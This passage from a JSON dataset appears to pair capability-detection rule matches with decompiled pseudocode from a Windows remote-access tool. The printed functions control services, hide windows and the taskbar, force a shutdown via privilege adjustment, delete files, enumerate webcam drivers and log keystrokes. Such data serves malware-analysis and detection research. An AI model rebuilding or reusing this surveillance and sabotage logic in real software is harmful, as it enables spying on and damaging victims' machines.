0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            var_1ch = iVar2;\n            (**(*var_18h + 0xc))();\n            cVar1 = fcn.00421fe0();\n            if (cVar1 == '\\x01') {\n                fcn.004055c8();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x46ee48, var_ch, 0x46ee48, var_124h);\n                uStack64 = 0x46ebfc;\n                fcn.00422068();\n                uStack64 = var_128h;\n                uStack68 = 0x46ee54;\n                fcn.004058e0();\n            }\n            else if (cVar1 == '\\x03') {\n                fcn.004055c8();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x46ee48, var_ch, 0x46ee48, var_130h);\n                uStack64 = 0x46ec71;\n                fcn.004220f4();\n                uStack64 = 0x46ec7c;\n                fcn.00409d70();\n                uStack64 = var_134h;\n                uStack68 = 0x46ee54;\n                fcn.004058e0();\n            }\n            else if (cVar1 == '\\x02') {\n                fcn.004055c8();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x46ee48, var_ch, 0x46ee48, var_13ch);\n                uStack64 = 0x46ecf4;\n                fcn.00422068();\n                uStack64 = var_140h;\n                uStack68 = 0x46ee54;\n                fcn.004058e0();\n            }\n            if (cVar1 == '\\x04') {\n                arg_8h = 0x100;\n                (**(*var_18h + 0xc))();\n                iVar2 = fcn.00422124(arg_8h);\n                if (0 < iVar2) {\n                    fcn.004055c8();\n                }\n                (**(*var_18h + 0xc))(*var_10h);\n                puStack48 = var_14ch;\n                uStack52 = 0x46ee48;\n                uStack56 = var_ch;\n                puStack60 = 0x46ee48;\n                uStack64 = 0x46ed8d;\n                fcn.004057a0();\n                uStack64 = var_150h;\n                uStack68 = 0x46ee54;\n                fcn.004058e0();\n            }\n            var_1ch = var_1ch + -1;\n            iVar2 = var_1ch;\n        } while (var_1ch != 0);\n    }\n    *in_FS_OFFSET = uStack68;\n    puStack60 = 0x46eddc;\n    uStack64 = 0x46edc4;\n    fcn.00421770();\n    uStack64 = 0x46edcc;\n    fcn.00404650();\n    uStack64 = 0x46edd4;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 1477
    },
    "004700d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004700d8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.004700d8::var_1h + 1;\n    puStack44 = &fcn.004700d8::var_1h + 1;\n    uStack36 = 0x470164;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    var_1h._0_1_ = 0;\n    uStack48 = 0x47013d;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    fcn.0045eac4(&fcn.004700d8::var_8h);\n    (**(_pe_dos_header + 0x78))();\n    fcn.0040711c();\n    if (var_8h == -2) {\n        var_1h._0_1_ = 0;\n    }\n    *in_FS_OFFSET = 0;\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x47016b;\n    puStack44 = 0x470163;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 357
    },
    "00470ed4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00470ed4(void)\n\n{\n    char in_AL;\n    \n    fcn.004216c4();\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.004218e4();\n    fcn.004218e4();\n    fcn.004218e4();\n    fcn.004218e4();\n    fcn.004218e4();\n    if (in_AL == '\\x01') {\n        fcn.00422008();\n    }\n    else if (in_AL == '\\0') {\n        fcn.00421d50();\n    }\n    fcn.00421770();\n    return;\n}\n",
        "token_count": 145
    },
    "00471010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "find graphical window",
            "find taskbar"
        ],
        "decompiled_code": "\nvoid fcn.00471010(void)\n\n{\n    char in_AL;\n    uint uVar1;\n    \n    if (in_AL == '\\x01') {\n        uVar1 = sub.user32.dll_FindWindowA(0x471068, 0, 0, 0x471060, 0, 0xffffffff);\n        uVar1 = sub.user32.dll_FindWindowExA(uVar1);\n        sub.user32.dll_EnableWindow(uVar1);\n        return;\n    }\n    if (in_AL == '\\0') {\n        uVar1 = sub.user32.dll_FindWindowA(0x471068, 0, 0, 0x471060, 0, 0);\n        uVar1 = sub.user32.dll_FindWindowExA(uVar1);\n        sub.user32.dll_EnableWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 184
    },
    "004710f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004710f0(void)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iVar4;\n    int32_t iStack160;\n    uint uStack156;\n    uchar *puStack152;\n    uint var_88h;\n    uint lpClassName;\n    uint var_4h;\n    \n    puStack152 = &stack0xfffffffc;\n    uStack156 = 0x4711ba;\n    iStack160 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack160;\n    iVar1 = sub.user32.dll_FindWindowA(0x4711c8, 0);\n    iVar2 = sub.user32.dll_GetWindow(iVar1, 5);\n    while (iVar4 = iVar2,  iVar4 != 0) {\n        iVar1 = iVar4;\n        iVar2 = sub.user32.dll_GetClassNameA();\n        uVar3 = iVar2 == 0;\n        if (0 < iVar2) {\n            fcn.0040aaa8();\n            fcn.004097dc();\n            fcn.00405974();\n            if (uVar3) {\n                if (in_AL == '\\x01') {\n                    iVar1 = iVar4;\n                    sub.user32.dll_ShowWindow();\n                }\n                else {\n                    iVar1 = iVar4;\n                    sub.user32.dll_ShowWindow();\n                }\n            }\n        }\n        iVar2 = sub.user32.dll_GetWindow(iVar4, 2, iVar1);\n        iVar1 = iVar4;\n    }\n    *in_FS_OFFSET = iVar1;\n    fcn.00405530(0x4711c1);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 383
    },
    "004714b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004714b8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_EDX;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY124;\n    int32_t iStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint lpServiceStatus;\n    uint var_28h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack64 = 0x4714d5;\n    var_8h = in_EDX;\n    fcn.004059cc();\n    uStack68 = 0x47159e;\n    iStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.00405530();\n    var_28h = 0;\n    var_10h = 0;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA(0, 0, 0xf003f);\n    if (iVar1 != 0) {\n        if (var_ch == 0) {\n            uVar4 = 0x20;\n        }\n        else {\n            uVar4 = 0x10;\n        }\n        uVar2 = fcn.004059dc(uVar4 | 4);\n        iVar3 = sub.advapi32.dll_OpenServiceA(iVar1, uVar2);\n        if (iVar3 != 0) {\n            if (var_8h != 0) {\n                if (var_ch == 0) {\n                    sub.advapi32.dll_ControlService(iVar3, 1, &fcn.004714b8::lpServiceStatus);\n                }\n                else {\n                    sub.advapi32.dll_StartServiceA(iVar3, 0, &fcn.004714b8::var_10h);\n                }\n            }\n            sub.advapi32.dll_QueryServiceStatus(iVar3, &fcn.004714b8::lpServiceStatus);\n            sub.advapi32.dll_CloseServiceHandle(iVar3);\n        }\n        sub.advapi32.dll_CloseServiceHandle();\n        iStackY124 = iVar1;\n    }\n    fcn.00471380();\n    *in_FS_OFFSET = iStackY124;\n    fcn.00405530(0x4715a5);\n    return;\n}\n",
        "token_count": 546
    },
    "00474d34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00474d34(void)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    while( true ) {\n        iVar1 = fcn.00474a6c();\n        iVar2 = iVar2 + iVar1;\n        if ((iVar1 == 1) && (*in_EAX == -0x3d)) break;\n        in_EAX = in_EAX + iVar1;\n        if (iVar1 == 0) {\n            return iVar2;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 132
    },
    "00475bd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.00475bd8(void)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack40 = &fcn.00475bd8::var_1h + 1;\n    puStack52 = &fcn.00475bd8::var_1h + 1;\n    uStack44 = 0x475d76;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack56 = 0x475d47;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    while( true ) {\n        puStack64 = 0x475c1f;\n        iVar2 = fcn.00483f50();\n        if (iVar2 < 1) break;\n        puStack64 = 0x475c10;\n        fcn.00483f50();\n        puStack64 = 0x475c15;\n        fcn.00484388();\n    }\n    while( true ) {\n        puStack64 = 0x475c3e;\n        iVar2 = fcn.00483f50();\n        uVar3 = iVar2 == 0;\n        if (iVar2 < 1) break;\n        puStack64 = 0x475c2f;\n        fcn.00483f50();\n        puStack64 = 0x475c34;\n        fcn.00484388();\n    }\n    puStack64 = 0x475c4f;\n    fcn.004735e8();\n    puStack64 = 0x475c5c;\n    fcn.00405974();\n    if (uVar3) {\n        puStack64 = 0x475c6b;\n        fcn.004735e8();\n        puStack64 = 0x475c7d;\n        fcn.0046ff10();\n    }\n    puStack64 = 0x475c8a;\n    fcn.004735e8();\n    puStack64 = 0x475c97;\n    fcn.00405974();\n    if (uVar3) {\n        puStack64 = 0x475c9e;\n        fcn.004853d8();\n    }\n    uStack68 = 0x475cec;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &fcn.00475bd8::var_1h + 1;\n    fcn.00471a2c();\n    fcn.00471b6c();\n    fcn.004724fc();\n    fcn.004725ec();\n    fcn.004726dc();\n    fcn.004727cc();\n    fcn.00471edc();\n    fcn.0047204c();\n    *in_FS_OFFSET = uStack72;\n    if (in_AL == '\\x01') {\n        puStack64 = 0x475d06;\n        fcn.0048a070();\n    }\n    puStack64 = 0x475d0b;\n    cVar1 = fcn.00473b6c();\n    if (cVar1 == '\\0') {\n        puStack64 = 0x475d19;\n        fcn.0040f234();\n        puStack64 = 0x475d26;\n        fcn.00474f80();\n    }\n    puStack64 = **0x494af0;\n    uStack68 = 0x475d33;\n    sub.wsock32.dll_closesocket();\n    uStack68 = 0x475d38;\n    sub.kernel32.dll_GetCurrentProcessId();\n    uStack68 = 0x475d3d;\n    fcn.00484388();\n    *in_FS_OFFSET = puStack64;\n    *in_FS_OFFSET = puStack52;\n    uStack44 = 0x475d7d;\n    uStack48 = 0x475d75;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1000
    },
    "00483f50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00483f50(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack332;\n    uint uStack328;\n    uchar *puStack324;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    puStack324 = 0x483f74;\n    fcn.004059cc();\n    uStack328 = 0x484037;\n    uStack332 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb4;\n    puStack324 = &stack0xfffffffc;\n    iVar1 = fcn.00460d3c();\n    if ((iVar1 != -1) && (iVar1 = fcn.00460d5c(),  iVar1 != 0)) {\n        while (iVar1 = fcn.00460d7c(),  iVar1 != 0) {\n            fcn.004057a0();\n            fcn.00409864();\n            fcn.00405b28();\n        }\n    }\n    *in_FS_OFFSET = uStack332;\n    puStack324 = 0x48403e;\n    uStack328 = 0x48402e;\n    fcn.00405554();\n    uStack328 = 0x484036;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 315
    },
    "00485954": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00485954(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    bool bVar3;\n    uint var_38h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    var_1ch = &stack0xfffffffc;\n    iVar2 = 7;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_14h = 0x485cbe;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *0x485d06 = 1;\n    bVar3 = true;\n    var_20h = 0x485c82;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_24h;\n    fcn.00405974();\n    if (bVar3) {\n        fcn.00489bb0();\n        fcn.00405818();\n        fcn.0048ab58();\n        fcn.00489bb0();\n        fcn.00405818();\n        fcn.0048ab58();\n        fcn.00489bb0(0x485d00);\n        fcn.00405818();\n        fcn.00489bb0(var_20h);\n        fcn.00405818();\n        fcn.0048a8ac();\n        fcn.00489bb0();\n        fcn.00405818();\n        fcn.0048aab0();\n        fcn.00489bb0();\n        fcn.00405818();\n        uVar1 = fcn.004059dc();\n        sub.kernel32.dll_DeleteFileA(uVar1);\n        fcn.00489bb0();\n        fcn.00405818();\n        var_30h = fcn.004059dc();\n        sub.kernel32.dll_DeleteFileA();\n        fcn.00409d70();\n        fcn.00485888();\n    }\n    else {\n        fcn.00405974();\n        if (bVar3) {\n            fcn.00405b28(&var_4h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.00405b28(&var_8h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            var_30h = &var_ch;\n            fcn.00405b28();\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.004055c8();\n            uVar1 = fcn.00409edc();\n            uVar1 = fcn.004059dc(uVar1);\n            uVar1 = fcn.004059dc(uVar1);\n            uVar1 = fcn.00409edc(uVar1);\n            sub.user32.dll_MessageBoxA_1(uVar1);\n        }\n        else {\n            fcn.00405974();\n            if (bVar3) {\n                fcn.00405b28(&var_4h);\n                fcn.00405a44();\n                fcn.00405b28();\n                fcn.00405a84();\n                fcn.004055c8();\n                uVar1 = fcn.00409edc();\n                var_30h = fcn.00409edc(uVar1);\n                sub.kernel32.dll_Beep();\n            }\n        }\n    }\n    *in_FS_OFFSET = var_30h;\n    *(var_14h + 0x48) = 0;\n    return;\n}\n",
        "token_count": 999
    },
    "0048a070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0048a070(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uchar auStack44 [40];\n    \n    if (**0x494d14 == 2) {\n        uStack52 = 0x28;\n        uStack56 = 0x48a088;\n        puStack48 = &stack0xffffffd4;\n        uStack56 = sub.kernel32.dll_GetCurrentProcess();\n        puStack60 = 0x48a08e;\n        iVar1 = sub.advapi32.dll_OpenProcessToken();\n        if (iVar1 != 0) {\n            puStack60 = &stack0xffffffd4;\n            uStack64 = 0x48a100;\n            uVar2 = 0;\n            iVar1 = sub.advapi32.dll_LookupPrivilegeValueA(0);\n            puStack60 = 0x1;\n            puStack48 = 0x2;\n            uStack64 = 0;\n            if (iVar1 != 0) {\n                sub.advapi32.dll_AdjustTokenPrivileges\n                          (uVar2, 0, &stack0xffffffc4, 0x10, &stack0xffffffd4, &stack0xffffffc0);\n            }\n        }\n    }\n    iVar1 = sub.user32.dll_ExitWindowsEx();\n    return iVar1 != 0;\n}\n",
        "token_count": 325
    },
    "0048b1a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048b1a0(code *param_1)\n\n{\n    char in_AL;\n    char cVar1;\n    \n    cVar1 = fcn.0048b104();\n    if (cVar1 != '\\0') {\n        if (in_AL == '\\x01') {\n            (*param_1)(0xffffffff);\n        }\n        else {\n            (*param_1)(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "0048c6ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0048c6ec(uint param_1, double *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    float10 fVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar auStack28 [16];\n    \n    uStack36 = *in_EAX;\n    uStack32 = in_EAX[1];\n    iVar1 = sub.kernel32.dll_FileTimeToSystemTime(&uStack36, auStack28);\n    if (iVar1 != 0) {\n        fVar2 = fcn.0040bc00();\n        *param_2 = fVar2;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 153
    },
    "0048cfb4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048cfb4(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack560;\n    uint uStack556;\n    uchar *puStack552;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ah;\n    uint var_105h;\n    \n    puStack552 = &stack0xfffffffc;\n    uStack556 = 0x48d07b;\n    uStack560 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd0;\n    iVar2 = 0;\n    while (iVar1 = sub.AVICAP32.DLL_capGetDriverDescriptionA\n                             (iVar2, &fcn.0048cfb4::var_105h, 0x105, &fcn.0048cfb4::var_20ah, 0x105),  iVar1 != 0) {\n        fcn.004057a0(*in_EAX);\n        fcn.004057a0(0x48d094, 0);\n        fcn.004058e0(0x48d0a0, 0);\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = uStack560;\n    puStack552 = 0x48d082;\n    uStack556 = 0x48d07a;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 324
    },
    "0048d0a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nulong fcn.0048d0a4(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack16 = 0x48d0e0;\n    uStack20 = 0x48d0f0;\n    iStack24 = 0x48d0b6;\n    iStack24 = sub.kernel32.dll_GetModuleHandleA_2();\n    pcVar1 = sub.kernel32.dll_GetProcAddress_1();\n    if (pcVar1 == NULL) {\n        unaff_EBX = 0;\n    }\n    else {\n        uVar2 = sub.kernel32.dll_GetCurrentProcess(&stack0xffffffe8);\n        iVar3 = (*pcVar1)(uVar2);\n        if (iVar3 != 0) {\n            unaff_EBX = iStack24 != 0;\n        }\n    }\n    return CONCAT44(iStack24, unaff_EBX);\n}\n",
        "token_count": 233
    },
    "00403e68": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00403e68(void)\n\n{\n    fcn.00403d88();\n    return;\n}\n",
        "token_count": 25
    },
    "00403e90": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403e90(uint param_1, int32_t param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    \n    if (2 < *(in_EAX + 1) - 0xd7b1) {\n        iVar1 = fcn.00407688();\n        *(iVar1 + 4) = 0x67;\n        return;\n    }\n    iVar1 = sub.kernel32.dll_SetFilePointer(*in_EAX, in_EAX[2] * param_2, 0, 0);\n    if (iVar1 != -1) {\n        return;\n    }\n    sub.kernel32.dll_GetLastError();\n    fcn.0040307c();\n    return;\n}\n",
        "token_count": 160
    },
    "00404544": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00404544(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x4045cb;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00404530();\n    fcn.00405794();\n    uVar1 = fcn.0040580c();\n    uVar1 = fcn.004059dc(uVar1);\n    uVar1 = fcn.0040580c(uVar1);\n    uVar1 = fcn.004059dc(uVar1);\n    uVar2 = 0x800;\n    sub.kernel32.dll_CompareStringA(0x800, 1, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x4045d2);\n    return;\n}\n",
        "token_count": 243
    },
    "0040a16c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a16c(uint param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0xffffffff;\n    if (((param_2 & 3) < 3) && ((param_2 & 0xf0) < 0x41)) {\n        uVar1 = fcn.004059dc(*((param_2 & 3) * 4 + 0x491858), *(((param_2 & 0xf0) >> 4) * 4 + 0x491864), 0, 3, 0x80, 0);\n        uVar1 = sub.kernel32.dll_CreateFileA_1(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 169
    },
    "0040b26d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b26d(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    char *unaff_EDI;\n    char *pcVar5;\n    char *pcVar6;\n    uint var_2ch;\n    uint var_5h;\n    \n    uVar3 = *(unaff_EBP + 8);\n    if (0x11 < uVar3) {\n        uVar3 = 0x12;\n    }\n    iVar2 = *(unaff_EBP + -0x2c);\n    if (iVar2 < 1) {\n        pcVar5 = unaff_EDI + 1;\n        *unaff_EDI = '0';\n    }\n    else {\n        iVar4 = 0;\n        if (*(unaff_EBP + 0x10) != '\\x02') {\n            iVar4 = (*(unaff_EBP + -0x2c) - 1U) % 3 + 1;\n        }\n        while( true ) {\n            pcVar6 = unaff_EDI;\n            cVar1 = fcn.0040b1c2();\n            pcVar5 = pcVar6 + 1;\n            *pcVar6 = cVar1;\n            iVar2 = extraout_ECX + -1;\n            uVar3 = extraout_EDX;\n            if (iVar2 == 0) break;\n            iVar4 = iVar4 + -1;\n            unaff_EDI = pcVar5;\n            if ((iVar4 == 0) && (*(unaff_EBP + -6) != '\\0')) {\n                *pcVar5 = *(unaff_EBP + -6);\n                iVar4 = 3;\n                unaff_EDI = pcVar6 + 2;\n            }\n        }\n    }\n    if (uVar3 != 0) {\n        pcVar6 = pcVar5;\n        if (*(unaff_EBP + -5) != '\\0') {\n            pcVar6 = pcVar5 + 1;\n            *pcVar5 = *(unaff_EBP + -5);\n        }\n        for (; iVar2 != 0; iVar2 = iVar2 + 1) {\n            *pcVar6 = '0';\n            uVar3 = uVar3 - 1;\n            if (uVar3 == 0) {\n                return;\n            }\n            pcVar6 = pcVar6 + 1;\n        }\n        do {\n            cVar1 = fcn.0040b1c2();\n            *pcVar6 = cVar1;\n            pcVar6 = pcVar6 + 1;\n        } while (extraout_EDX_00 != 1);\n    }\n    return;\n}\n",
        "token_count": 648
    },
    "0040eb08": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040eb08(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    *0x4978c8 = 0x409;\n    *0x4978cc = 9;\n    *0x4978d0 = 1;\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1();\n    if (uVar1 != 0) {\n        *0x4978c8 = uVar1;\n    }\n    if (uVar1 != 0) {\n        *0x4978cc = uVar1 & 0x3ff;\n        *0x4978d0 = (uVar1 & 0xffff) >> 10;\n    }\n    puVar3 = 0x40ebac;\n    puVar4 = 0x491828;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if ((*0x4917e4 < 5) || (*0x4917e0 != 2)) {\n        iVar2 = sub.user32.dll_GetSystemMetrics(0x4a);\n        *0x4978d5 = iVar2 != 0;\n    }\n    else {\n        *0x4978d5 = true;\n    }\n    iVar2 = sub.user32.dll_GetSystemMetrics(0x2a);\n    *0x4978d4 = iVar2 != 0;\n    if (*0x4978d4) {\n        fcn.0040eaac(&stack0xfffffffc);\n    }\n    return;\n}\n",
